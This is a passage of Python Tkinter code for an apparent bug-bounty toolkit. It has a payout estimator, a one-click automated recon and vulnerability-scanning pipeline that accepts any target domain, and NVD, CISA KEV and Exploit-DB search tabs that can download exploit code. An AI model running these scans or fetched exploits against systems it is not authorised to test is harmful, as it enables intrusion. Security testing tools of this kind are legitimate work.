        self._bounty_vuln = tk.StringVar(value="XSS")
        ttk.Combobox(f1, textvariable=self._bounty_vuln,
                     values=["XSS","SQLi","SSRF","RCE","IDOR","Auth Bypass","LFI","XXE","SSTI","Open Redirect","CORS","Info Disclosure"],
                     width=16, font=MONO_S).pack(side='left', padx=8)
        tk.Label(f1, text="CVSS:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._bounty_cvss = tk.StringVar(value="7.5")
        mk_entry(f1, var=self._bounty_cvss, w=8).pack(side='left', ipady=3)
        f2 = mk_frame(pad, bg=BG2); f2.pack(fill='x', pady=(0,6))
        tk.Label(f2, text="Platform:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._bounty_platform = tk.StringVar(value="HackerOne")
        ttk.Combobox(f2, textvariable=self._bounty_platform, values=["HackerOne","Bugcrowd"], width=12, font=MONO_S).pack(side='left', padx=8)
        tk.Label(f2, text="Program Size:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._bounty_size = tk.StringVar(value="medium")
        ttk.Combobox(f2, textvariable=self._bounty_size, values=["small","medium","large","enterprise"], width=12, font=MONO_S).pack(side='left', padx=8)
        mk_btn(f2, "💰 Calculate", self._calc_bounty, GREEN).pack(side='right', padx=4, ipady=4)
        # Result card
        self._bounty_result_card = mk_card(pad)
        self._bounty_result_card.pack(fill='x', pady=(10,10))
        self._bounty_result_lbl = tk.Label(self._bounty_result_card, text="Enter details and click Calculate",
                                            bg=BG3, fg=FG2, font=MONO_S)
        self._bounty_result_lbl.pack(pady=16, padx=20)
        # Tips
        tk.Label(pad, text="MAXIMIZE YOUR PAYOUT:", bg=BG2, fg=ACCENT, font=MONO_B).pack(anchor='w', pady=(10,4))
        self._bounty_tips_txt = mk_stext(pad, h=14, bg=BG3, fg=FG)
        self._bounty_tips_txt.pack(fill='both', expand=True)
        self._bounty_tips_txt.config(state='normal')
        self._bounty_tips_txt.insert('end',
            "Tip 1: Always demonstrate FULL impact — show data exfiltration or account takeover\n"
            "Tip 2: Chained bugs (multiple vulnerabilities) pay 2-5x more than single bugs\n"
            "Tip 3: Include video PoC for complex vulnerabilities\n"
            "Tip 4: Submit during program bonus periods for 2x payouts\n"
            "Tip 5: Stored XSS pays 3-5x more than Reflected XSS\n"
            "Tip 6: SSRF reaching cloud metadata (AWS/GCP) is instant CRITICAL\n"
            "Tip 7: IDOR on payment/PII data = instant HIGH or CRITICAL\n"
            "Tip 8: Auth bypass = CRITICAL even without full data access\n"
        )
        self._bounty_tips_txt.config(state='disabled')

    def _calc_bounty(self):
        try:
            cvss  = float(self._bounty_cvss.get())
            vuln  = self._bounty_vuln.get()
            plat  = self._bounty_platform.get()
            size  = self._bounty_size.get()
            r     = auto_exploit.estimate_bounty(vuln, cvss, plat, size)
            low   = r.get('estimate_low','$0')
            high  = r.get('estimate_high','$0')
            sev   = r.get('severity','N/A')
            sev_c = {RED:'CRITICAL','HIGH':YELLOW,'MEDIUM':CYAN,'P1':RED,'P2':YELLOW}.get(sev, GREEN)
            clr   = {'CRITICAL':RED,'HIGH':YELLOW,'MEDIUM':CYAN,'LOW':GREEN,'P1':RED,'P2':YELLOW,'P3':CYAN,'P4':GREEN}.get(sev, FG2)
            self._bounty_result_lbl.config(
                text=f"Estimated Payout: {low} — {high}\n"
                     f"Severity: {sev}  |  Platform: {plat}  |  CVSS: {cvss}\n"
                     f"{r.get('description','')}",
                fg=clr, font=MONO_B)
            self._bounty_tips_txt.config(state='normal')
            self._bounty_tips_txt.delete('1.0','end')
            self._bounty_tips_txt.insert('end', f"[{sev}] {vuln} on {plat}\n")
            self._bounty_tips_txt.insert('end', f"Range: {low} — {high}\n\n")
            self._bounty_tips_txt.insert('end', "TIPS TO MAXIMIZE:\n")
            for tip in r.get('tips',[]):
                self._bounty_tips_txt.insert('end', f"  • {tip}\n")
            self._bounty_tips_txt.insert('end', "\nGENERAL TIPS:\n")
            for tip in r.get('maximize_tips',[]):
                self._bounty_tips_txt.insert('end', f"  • {tip}\n")
            self._bounty_tips_txt.config(state='disabled')
            self.set_status(f"Bounty estimate: {low}—{high}", GREEN)
        except ValueError:
            messagebox.showwarning("Invalid CVSS","Enter a number 0.0-10.0.", parent=self.root)


    # ════════════════════════════════════════════════════════════════
    #  AUTO-RECON — ONE-CLICK FULL PIPELINE
    # ════════════════════════════════════════════════════════════════
    def _build_auto_recon(self, frame):
        """Enter target → everything runs automatically."""
        frame.configure(bg=BG2)
        # Split layout
        top = mk_frame(frame, bg=BG2); top.pack(fill='x', padx=16, pady=(12,6))
        mid = mk_frame(frame, bg=BG2); mid.pack(fill='x', padx=16, pady=(0,6))
        bot = mk_frame(frame, bg=BG2); bot.pack(fill='both', expand=True, padx=16, pady=(0,12))

        # ── Header ────────────────────────────────────────────────
        mk_section(top, "AUTO-RECON PIPELINE", "🤖").pack(fill='x', pady=(0,10))

        info = mk_card(top); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Enter target → Full automated bug hunting pipeline runs automatically\n"
            "  Subdomain Enum → DNS → HTTP Probe → Port Scan → Tech Detect → WAF → URL Discovery\n"
            "  → Param Discovery → Takeover Check → Nuclei Vuln Scan → XSS → SQLi → Dir Fuzz → Screenshots → Secret Scan"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=10, pady=8)

        # ── Target input ──────────────────────────────────────────
        tr = mk_frame(top, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Target:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ar_target = tk.StringVar(value=self.project.get() or "")
        mk_entry(tr, var=self._ar_target, w=46).pack(side='left', padx=8, ipady=4)
        mk_btn(tr, "← Project", lambda: self._ar_target.set(self.project.get()), FG3, small=True).pack(side='left')
        tk.Label(tr, text="e.g. example.com or https://example.com", bg=BG2, fg=FG3, font=MONO_T).pack(side='left', padx=8)

        # ── Phase checkboxes ──────────────────────────────────────
        phases_f = mk_card(top); phases_f.pack(fill='x', pady=(0,8))
        tk.Label(phases_f, text="  PHASES:", bg=BG3, fg=ACCENT, font=MONO_B).pack(anchor='w', padx=10, pady=(8,4))
        self._ar_phase_vars = {}
        grid = mk_frame(phases_f, bg=BG3); grid.pack(fill='x', padx=10, pady=(0,8))
        for i, phase in enumerate(PIPELINE_PHASES):
            var = tk.BooleanVar(value=True)
            self._ar_phase_vars[phase['id']] = var
            r, c = divmod(i, 5)
            ttk.Checkbutton(grid, text=f"{phase['icon']} {phase['name']}",
                           variable=var).grid(row=r, column=c, sticky='w', padx=6, pady=2)

        # ── Control buttons ───────────────────────────────────────
        bf = mk_frame(top, bg=BG2); bf.pack(fill='x', pady=(0,8))
        self._ar_run_btn  = mk_btn(bf, "▶▶ START FULL AUTO-RECON", self._ar_start, GREEN)
        self._ar_run_btn.pack(side='left', ipady=8, padx=(0,10))
        self._ar_stop_btn = mk_btn(bf, "■ STOP", self._ar_stop, RED)
        self._ar_stop_btn.pack(side='left', ipady=8, padx=4)
        self._ar_quick_btn = mk_btn(bf, "⚡ QUICK SCAN (Phase 1-3)", self._ar_quick, CYAN)
        self._ar_quick_btn.pack(side='left', ipady=8, padx=4)

        self._ar_status_lbl = tk.Label(bf, text="Ready", bg=BG2, fg=FG3, font=MONO_S)
        self._ar_status_lbl.pack(side='left', padx=12)

        # Tool check button
        mk_btn(bf, "🔧 Check Tools", self._ar_check_tools, FG2, small=True).pack(side='right', padx=4)
        mk_btn(bf, "📂 Open Results", lambda: open_folder(str(LOGS_DIR)), FG2, small=True).pack(side='right', padx=4)

        # ── Phase progress indicators ─────────────────────────────
        phases_prog = mk_card(top); phases_prog.pack(fill='x', pady=(0,8))
        self._ar_phase_labels = {}
        pg_grid = mk_frame(phases_prog, bg=BG3); pg_grid.pack(fill='x', padx=10, pady=8)
        for i, phase in enumerate(PIPELINE_PHASES):
            r, c = divmod(i, 5)
            lbl = tk.Label(pg_grid, text=f"{phase['icon']} {phase['name'][:14]}",
                           bg=BG3, fg=FG3, font=MONO_T, width=18, anchor='w')
            lbl.grid(row=r, column=c, sticky='w', padx=4, pady=1)
            self._ar_phase_labels[phase['id']] = lbl

        # ── Stats row ─────────────────────────────────────────────
        stats_row = mk_frame(mid, bg=BG2); stats_row.pack(fill='x', pady=(0,6))
        self._ar_stat_labels = {}
        for label, key, clr in [
            ("Subdomains", "subdomains", CYAN),
            ("Alive Hosts", "alive", GREEN),
            ("URLs", "urls", YELLOW),
            ("Params", "params", FG2),
            ("Vulns Found", "vulns", RED),
        ]:
            card = mk_stat(stats_row, label, "—", clr)
            card.pack(side='left', fill='both', expand=True, padx=4)
            self._ar_stat_labels[key] = card

        # ── Terminal output ───────────────────────────────────────
        tk.Label(bot, text="Pipeline Output:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,4))
        self._ar_term = Terminal(bot, height=18, title="AUTO-RECON ENGINE")
        self._ar_term.pack(fill='both', expand=True)

        # Pipeline reference
        self._ar_pipeline = None

    def _ar_start(self):
        target = self._ar_target.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter a target domain or URL.", parent=self.root)
            return
        if not target.startswith('http'):
            target = 'https://' + target

        phases = [pid for pid, var in self._ar_phase_vars.items() if var.get()]
        if not phases:
            messagebox.showwarning("No Phases", "Select at least one phase.", parent=self.root)
            return

        self._ar_status_lbl.config(text=f"Running phases: {phases}", fg=GREEN)
        self._ar_run_btn.config(state='disabled')

        # Reset phase labels
        for pid, lbl in self._ar_phase_labels.items():
            lbl.config(fg=FG3 if pid in phases else FG3)

        def log_cb(text, tag='normal'):
            self._ar_term.log(text, tag)
            # Update phase labels based on log messages
            for pid, phase in enumerate(PIPELINE_PHASES, 1):
                if f"Phase {pid}:" in text:
                    self.root.after(0, lambda p=pid: self._ar_phase_labels[p].config(fg=CYAN))
                elif phase['name'] in text and 'done' in text.lower():
                    self.root.after(0, lambda p=pid: self._ar_phase_labels[p].config(fg=GREEN))

        def finding_cb(finding):
            try:
                from main import save_finding
                finding['project']   = self._ar_target.get().strip().replace('https://','').replace('http://','').split('/')[0]
                finding['timestamp'] = __import__('datetime').datetime.now().isoformat()
                save_finding(finding)
                self.root.after(0, lambda: self.set_status(
                    f"[!] Finding: {finding.get('title','')[:60]}", RED))
            except Exception:
                pass

        pipeline = get_pipeline_for_target(target, phases=phases,
                                            log_cb=log_cb, finding_cb=finding_cb)
        self._ar_pipeline = pipeline

        def _run():
            pipeline.run()
            # Update stats when done
            r = pipeline.results
            def _update():
                for key, val in [
                    ("subdomains", len(r["subdomains"])),
                    ("alive",      len(r["alive_hosts"])),
                    ("urls",       len(r["urls"])),
                    ("params",     len(r["params"])),
                    ("vulns",      len(r["vulns"])),
                ]:
                    for child in self._ar_stat_labels[key].winfo_children():
                        if isinstance(child, tk.Label):
                            try: child.config(text=str(val))
                            except: pass
                self._ar_run_btn.config(state='normal')
                self._ar_status_lbl.config(text="Complete!", fg=GREEN)
                self.set_status(f"Auto-recon done: {len(r['vulns'])} vulns found", GREEN if not r['vulns'] else RED)
            self.root.after(0, _update)

        threading.Thread(target=_run, daemon=True).start()

    def _ar_stop(self):
        if self._ar_pipeline:
            self._ar_pipeline.stop()
        self._ar_run_btn.config(state='normal')
        self._ar_status_lbl.config(text="Stopped", fg=YELLOW)

    def _ar_quick(self):
        """Quick scan - phases 1-3 only."""
        for pid, var in self._ar_phase_vars.items():
            var.set(pid in (1, 2, 3))
        self._ar_start()

    def _ar_check_tools(self):
        tools = check_tools()
        installed = [t for t, ok in tools.items() if ok]
        missing   = [t for t, ok in tools.items() if not ok]

        from modules.recon.auto_pipeline import REQUIRED_TOOLS
        msg  = f"Installed ({len(installed)}):\n"
        msg += "  " + ", ".join(installed) + "\n\n"
        msg += f"Missing ({len(missing)}):\n"
        for t in missing:
            cmd = REQUIRED_TOOLS.get(t, {}).get("install", f"apt install {t}")
            msg += f"  {t}: {cmd}\n"

        self._show_text("Tool Check", msg)

    # ════════════════════════════════════════════════════════════════
    #  CVE INTELLIGENCE — NVD + CISA + EXPLOIT-DB
    # ════════════════════════════════════════════════════════════════
    def _build_cve_intel(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1  = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🔍 CVE Search  ")
        f2  = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  🚨 CISA KEV  ")
        f3  = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  💥 Exploit-DB  ")
        f4  = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  📊 Latest Critical  ")
        f5  = tk.Frame(nb2, bg=BG2); nb2.add(f5, text="  🔗 Full Intel  ")
        self._build_cve_search_tab(f1)
        self._build_cisa_kev_tab(f2)
        self._build_exploitdb_tab(f3)
        self._build_latest_cves_tab(f4)
        self._build_full_intel_tab(f5)

    def _build_cve_search_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "NVD CVE SEARCH", "🔍").pack(fill='x', pady=(0,8))

        sr = mk_frame(pad, bg=BG2); sr.pack(fill='x', pady=(0,8))
        tk.Label(sr, text="Query:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._cvi_query = tk.StringVar()
        se = mk_entry(sr, var=self._cvi_query, w=34)
        se.pack(side='left', padx=8, ipady=3)
        se.bind('<Return>', lambda e: self._cvi_search())
        tk.Label(sr, text="Severity:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._cvi_sev = tk.StringVar(value="ALL")
        ttk.Combobox(sr, textvariable=self._cvi_sev,
                     values=["ALL","CRITICAL","HIGH","MEDIUM","LOW"], width=10, font=MONO_S).pack(side='left')
        tk.Label(sr, text="Days:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._cvi_days = tk.StringVar(value="0")
        ttk.Combobox(sr, textvariable=self._cvi_days,
                     values=["0","1","7","30","90","365"], width=6, font=MONO_S).pack(side='left')
        mk_btn(sr, "🔍 Search NVD", self._cvi_search, ACCENT, small=True).pack(side='left', padx=8)
        self._cvi_count_lbl = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._cvi_count_lbl.pack(anchor='w', pady=(0,4))

        cols = ('CVE ID','Score','Severity','Published','KEV?','Description')
        self._cvi_tree = mk_tree(pad, columns=cols, show='headings', height=16)
        wsz = {'CVE ID':120,'Score':60,'Severity':80,'Published':90,'KEV?':50,'Description':400}
        for c in cols:
            self._cvi_tree.heading(c, text=c, anchor='w')
            self._cvi_tree.column(c, width=wsz.get(c,100), anchor='w')
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW'):
            self._cvi_tree.tag_configure(sev, foreground=SEV_COLOR(sev), background=SEV_BG(sev))
        self._cvi_tree.tag_configure('KEV', foreground=RED, background='#1a0005')
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._cvi_tree.yview)
        self._cvi_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._cvi_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        self._cvi_tree.bind('<Double-1>', self._cvi_open_nvd)
        self._cvi_tree.bind('<<TreeviewSelect>>', self._cvi_show_detail)

        self._cvi_detail = mk_stext(pad, h=5, bg=BG3, fg=FG)
        self._cvi_detail.pack(fill='x', pady=(4,0))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, "🌐 Open NVD", self._cvi_open_nvd, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💥 Find Exploits", self._cvi_find_exploits, RED, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📋 Copy CVE ID", self._cvi_copy_id, FG2, small=True).pack(side='left', padx=4)
        self._cvi_data = []

    def _cvi_search(self):
        q   = self._cvi_query.get().strip()
        sev = self._cvi_sev.get()
        try: days = int(self._cvi_days.get())
        except: days = 0
        if not q and days == 0:
            messagebox.showwarning("Empty Query", "Enter a keyword, CVE ID, or select Days Back.", parent=self.root); return
        self._cvi_count_lbl.config(text="⏳ Searching NVD...", fg=CYAN)
        self._cvi_tree.delete(*self._cvi_tree.get_children())
        def _go():
            kw   = q if q else ""
            cid  = q if q.upper().startswith("CVE-") else ""
            sev2 = sev if sev != "ALL" else ""
            r    = search_nvd(keyword=kw if not cid else "",
                              cve_id=cid, days_back=days, severity=sev2, per_page=50)
            cves = r.get("cves", [])
            try:
                kev_data = fetch_cisa_kev()
                kev_ids  = {v.get("cveID","") for v in kev_data.get("vulnerabilities",[])}
            except Exception:
                kev_ids = set()
            self._cvi_data = cves
            def _upd():
                self._cvi_tree.delete(*self._cvi_tree.get_children())
                for cve in cves:
                    sev_val = str(cve.get("severity","N/A")).upper()
                    in_kev  = cve["id"] in kev_ids
                    tag     = "KEV" if in_kev else sev_val
                    self._cvi_tree.insert('','end', values=(
                        cve["id"], cve.get("score","N/A"), sev_val,
                        cve.get("published",""), "🚨 YES" if in_kev else "—",
                        cve.get("description","")[:90],
                    ), tags=(tag,))
                err = r.get("error","")
                tot = r.get("total", len(cves))
                if err:
                    self._cvi_count_lbl.config(text=f"⚠ Error: {err}", fg=RED)
                else:
                    kev_matches = sum(1 for c in cves if c['id'] in kev_ids)
                    self._cvi_count_lbl.config(
                        text=f"✅ Results: {len(cves)} of {tot}  |  KEV: {kev_matches}  |  Double-click to open NVD",
                        fg=GREEN if cves else YELLOW)
                self.set_status(f"NVD: {len(cves)} CVEs found", GREEN if cves else YELLOW)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _cvi_show_detail(self, _e=None):
        sel = self._cvi_tree.selection()
        if not sel or not self._cvi_data: return
        cve_id = str(self._cvi_tree.item(sel[0])['values'][0])
        cve    = next((c for c in self._cvi_data if c['id'] == cve_id), None)
        if not cve: return
        self._cvi_detail.config(state='normal')
        self._cvi_detail.delete('1.0','end')
        self._cvi_detail.insert('end', f"ID:          {cve['id']}\n")
        self._cvi_detail.insert('end', f"CVSS:        {cve.get('score','N/A')} [{cve.get('severity','N/A')}]\n")
        self._cvi_detail.insert('end', f"Vector:      {cve.get('vector','N/A')}\n")
        self._cvi_detail.insert('end', f"CWEs:        {', '.join(cve.get('cwes',[]))}\n")
        self._cvi_detail.insert('end', f"Published:   {cve.get('published','')}\n\n")
        self._cvi_detail.insert('end', f"Description: {cve.get('description','')}\n\n")
        for ref in cve.get('references',[])[:3]:
            self._cvi_detail.insert('end', f"Ref: {ref}\n")
        self._cvi_detail.config(state='disabled')

    def _cvi_open_nvd(self, _e=None):
        sel = self._cvi_tree.selection()
        if not sel: return
        cve_id = str(self._cvi_tree.item(sel[0])['values'][0])
        webbrowser.open(f"https://nvd.nist.gov/vuln/detail/{cve_id}")

    def _cvi_copy_id(self):
        sel = self._cvi_tree.selection()
        if not sel: return
        cve_id = str(self._cvi_tree.item(sel[0])['values'][0])
        self.root.clipboard_clear(); self.root.clipboard_append(cve_id)
        self.set_status(f"Copied: {cve_id}", GREEN)

    def _cvi_find_exploits(self):
        sel = self._cvi_tree.selection()
        if not sel: return
        cve_id = str(self._cvi_tree.item(sel[0])['values'][0])
        self.set_status(f"Searching exploits for {cve_id}...", CYAN)
        def _go():
            r = search_exploitdb(cve_id, limit=10)
            exploits = r.get("exploits",[])
            def _upd():
                if not exploits:
                    self.set_status(f"No exploits in ExploitDB for {cve_id}", YELLOW)
                    webbrowser.open(f"https://www.exploit-db.com/search?q={cve_id}")
                    return
                txt = f"Exploits for {cve_id}:\n\n"
                for e in exploits:
                    txt += f"[EDB-{e['id']}] {e['title']}\n"
                    txt += f"  Date: {e['date']}  Type: {e['type']}  Platform: {e['platform']}\n"
                    txt += f"  URL: {e['url']}\n\n"
                self._show_text(f"Exploits: {cve_id}", txt)
                self.set_status(f"Found {len(exploits)} exploits for {cve_id}", RED)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_cisa_kev_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "CISA KNOWN EXPLOITED VULNERABILITIES", "🚨").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text="  CISA KEV = vulnerabilities being actively exploited in the wild RIGHT NOW\n"
                 "  These are highest priority for bug bounty — check if your target runs vulnerable versions",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=8)

        sr = mk_frame(pad, bg=BG2); sr.pack(fill='x', pady=(0,8))
        tk.Label(sr, text="Search:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._kev_q = tk.StringVar()
        se = mk_entry(sr, var=self._kev_q, w=32); se.pack(side='left', padx=8, ipady=3)
        se.bind('<Return>', lambda e: self._kev_search())
        tk.Label(sr, text="Vendor:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._kev_vendor = tk.StringVar()
        mk_entry(sr, var=self._kev_vendor, w=18).pack(side='left', ipady=3)
        mk_btn(sr, "🔍 Search KEV", self._kev_search, RED, small=True).pack(side='left', padx=8)
        mk_btn(sr, "🔄 Load All", lambda: self._kev_load_all(), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(sr, "🎯 Check My Target", self._kev_check_target, YELLOW, small=True).pack(side='left', padx=4)
        self._kev_stat = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._kev_stat.pack(anchor='w', pady=(0,4))

        cols = ('CVE ID','Vendor','Product','Name','Date Added','Due Date')
        self._kev_tree = mk_tree(pad, columns=cols, show='headings', height=20)
        wsz = {'CVE ID':120,'Vendor':120,'Product':150,'Name':260,'Date Added':95,'Due Date':95}
        for c in cols:
            self._kev_tree.heading(c, text=c, anchor='w')
            self._kev_tree.column(c, width=wsz.get(c,100), anchor='w')
        self._kev_tree.tag_configure('row', foreground=RED, background=BG3)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._kev_tree.yview)
        self._kev_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._kev_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        self._kev_tree.bind('<Double-1>', lambda e: webbrowser.open(
            f"https://nvd.nist.gov/vuln/detail/{self._kev_tree.item(self._kev_tree.selection()[0])['values'][0]}"
            if self._kev_tree.selection() else ""))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, "📋 Copy CVE IDs", self._kev_copy_ids, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Export CSV", self._kev_export, GREEN, small=True).pack(side='left', padx=4)

    def _kev_populate(self, results):
        self._kev_tree.delete(*self._kev_tree.get_children())
        for v in results:
            self._kev_tree.insert('','end', values=(
                v.get('cve_id',''), v.get('vendor',''),
                v.get('product',''), v.get('name','')[:60],
                v.get('date_added',''), v.get('due_date','')), tags=('row',))
        self._kev_stat.config(text=f"Showing {len(results)} entries", fg=GREEN if results else RED)

    def _kev_search(self):
        q = self._kev_q.get().strip()
        v = self._kev_vendor.get().strip()
        self._kev_stat.config(text="Searching CISA KEV...", fg=CYAN)
        def _go():
            r = __import__('modules.analysis.cve_fetcher', fromlist=['search_kev']).search_kev(q, v)
            self.root.after(0, lambda: self._kev_populate(r.get('results',[])))
        threading.Thread(target=_go, daemon=True).start()

    def _kev_load_all(self):
        self._kev_stat.config(text="Loading full CISA KEV catalog...", fg=CYAN)
        def _go():
            data  = fetch_cisa_kev(force_refresh=True)
            vulns = data.get("vulnerabilities",[])
            results = [{"cve_id": v.get("cveID",""), "vendor": v.get("vendorProject",""),
                        "product": v.get("product",""), "name": v.get("vulnerabilityName",""),
                        "date_added": v.get("dateAdded",""), "due_date": v.get("dueDate",""),
                        "short_desc": v.get("shortDescription","")} for v in vulns]
            self.root.after(0, lambda: (self._kev_populate(results),
                self._kev_stat.config(text=f"CISA KEV: {len(results)} actively exploited CVEs", fg=RED)))
        threading.Thread(target=_go, daemon=True).start()

    def _kev_check_target(self):
        proj = self.project.get().strip()
        if not proj:
            messagebox.showwarning("No Target","Set a project target first.", parent=self.root); return
        # Search KEV for target technology
        httpx_file = LOGS_DIR / proj / "httpx_results.txt"
        if httpx_file.exists():
            techs = set(re.findall(r'\[([^\]]+)\]', httpx_file.read_text()))
            self._kev_q.set(" ".join(list(techs)[:3]))
        else:
            self._kev_q.set(proj.split('.')[0])
        self._kev_search()

    def _kev_copy_ids(self):
        ids = [str(self._kev_tree.item(i)['values'][0]) for i in self._kev_tree.get_children()]
        self.root.clipboard_clear(); self.root.clipboard_append('\n'.join(ids))
        self.set_status(f"Copied {len(ids)} CVE IDs!", GREEN)

    def _kev_export(self):
        items = [self._kev_tree.item(i)['values'] for i in self._kev_tree.get_children()]
        if not items: return
        csv_text = "CVE ID,Vendor,Product,Name,Date Added,Due Date\n"
        for row in items:
            csv_text += ','.join(f'"{str(v)}"' for v in row) + "\n"
        self._save_text(csv_text)

    def _build_exploitdb_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "EXPLOIT-DB SEARCH", "💥").pack(fill='x', pady=(0,8))
        sr = mk_frame(pad, bg=BG2); sr.pack(fill='x', pady=(0,8))
        tk.Label(sr, text="Search:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._edb_q = tk.StringVar()
        se = mk_entry(sr, var=self._edb_q, w=36); se.pack(side='left', padx=8, ipady=3)
        se.bind('<Return>', lambda e: self._edb_search())
        mk_btn(sr, "💥 Search", self._edb_search, RED, small=True).pack(side='left', padx=4)
        mk_btn(sr, "🎯 For My Target", self._edb_for_target, YELLOW, small=True).pack(side='left', padx=4)
        self._edb_stat = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._edb_stat.pack(anchor='w', pady=(0,4))

        cols = ('EDB-ID','Title','Date','Type','Platform','Verified')
        self._edb_tree = mk_tree(pad, columns=cols, show='headings', height=16)
        wsz = {'EDB-ID':70,'Title':320,'Date':90,'Type':100,'Platform':100,'Verified':70}
        for c in cols:
            self._edb_tree.heading(c, text=c, anchor='w')
            self._edb_tree.column(c, width=wsz.get(c,100), anchor='w')
        self._edb_tree.tag_configure('verified', foreground=GREEN, background=BG3)
        self._edb_tree.tag_configure('unverified', foreground=FG2, background=BG3)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._edb_tree.yview)
        self._edb_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._edb_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        self._edb_tree.bind('<Double-1>', self._edb_open)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, "🌐 Open Exploit", self._edb_open, RED, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📥 Download Code", self._edb_download, YELLOW, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📋 Copy URL", self._edb_copy_url, FG2, small=True).pack(side='left', padx=4)
        self._edb_data = []

    def _edb_search(self):
        q = self._edb_q.get().strip()
        if not q: return
        self._edb_stat.config(text="Searching Exploit-DB...", fg=CYAN)
        self._edb_tree.delete(*self._edb_tree.get_children())
        def _go():
            r = search_exploitdb(q, limit=50)
            exploits = r.get("exploits", [])
            self._edb_data = exploits
            def _upd():
                for e in exploits:
                    tag = 'verified' if e.get('verified') else 'unverified'
                    self._edb_tree.insert('','end', values=(
                        e.get('id',''), e.get('title','')[:60],
                        e.get('date',''), e.get('type',''),
                        e.get('platform',''), "✓" if e.get('verified') else ""), tags=(tag,))
                err = r.get("error","")
                if err:
                    self._edb_stat.config(
                        text=f"API error ({err}) — try: {r.get('fallback','exploit-db.com')}",
                        fg=YELLOW)
                else:
                    self._edb_stat.config(
                        text=f"Found: {len(exploits)} of {r.get('total',len(exploits))} exploits",
                        fg=GREEN if exploits else YELLOW)
                self.set_status(f"Exploit-DB: {len(exploits)} exploits for '{q}'", GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _edb_open(self, _e=None):
        sel = self._edb_tree.selection()
        if not sel: return
        edb_id = str(self._edb_tree.item(sel[0])['values'][0])
        webbrowser.open(f"https://www.exploit-db.com/exploits/{edb_id}")

    def _edb_download(self):
        sel = self._edb_tree.selection()
        if not sel: return
        edb_id = str(self._edb_tree.item(sel[0])['values'][0])
        self.set_status(f"Downloading EDB-{edb_id}...", CYAN)
        def _go():
            from modules.analysis.cve_fetcher import get_exploit_by_id
            r = get_exploit_by_id(edb_id)
            code = r.get('code','')
            if code:
                self.root.after(0, lambda: self._show_text(f"Exploit EDB-{edb_id}", code))
            else:
                self.root.after(0, lambda: webbrowser.open(f"https://www.exploit-db.com/download/{edb_id}"))
        threading.Thread(target=_go, daemon=True).start()

    def _edb_copy_url(self):
        sel = self._edb_tree.selection()
        if not sel: return
        edb_id = str(self._edb_tree.item(sel[0])['values'][0])
        url = f"https://www.exploit-db.com/exploits/{edb_id}"
        self.root.clipboard_clear(); self.root.clipboard_append(url)
        self.set_status(f"Copied: {url}", GREEN)

    def _edb_for_target(self):
        proj = self.project.get().strip()
        if not proj: return
        # Try to get tech info
        self._edb_q.set(proj.split('.')[0])
        self._edb_search()

    def _build_latest_cves_tab(self, frame):
